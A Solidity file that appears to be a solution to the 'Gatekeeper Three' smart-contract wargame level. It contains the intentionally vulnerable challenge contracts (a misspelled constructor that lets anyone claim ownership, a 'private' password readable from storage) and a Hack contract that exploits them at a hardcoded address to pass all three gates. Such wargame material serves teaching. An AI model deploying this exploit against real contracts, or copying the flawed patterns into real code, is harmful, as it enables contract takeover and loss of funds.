// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allow_enterance = false;
    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allow_enterance == true);
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allow_enterance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree returns (bool entered) {
        entrant = tx.origin;
        return true;
    }

    receive() external payable {}
}

contract Hack {
    GatekeeperThree immutable target =
        GatekeeperThree(payable(0xD4a147b985CdEaBb566ADa4B81d7dE0644228Dc7));

    constructor() payable {
        require(msg.value == 0.001000000000000001 ether);
    }

    function init() external {
        target.construct0r();
        target.createTrick();
    }

    function attack(uint256 _password) external returns (bool success) {
        //_password = await web3.eth.getStorageAt(address(this), 2)
        target.getAllowance(_password);
        bool ok = payable(address(target)).send(address(this).balance);
        if (ok) {
            success = target.enter();
        }
    }
}
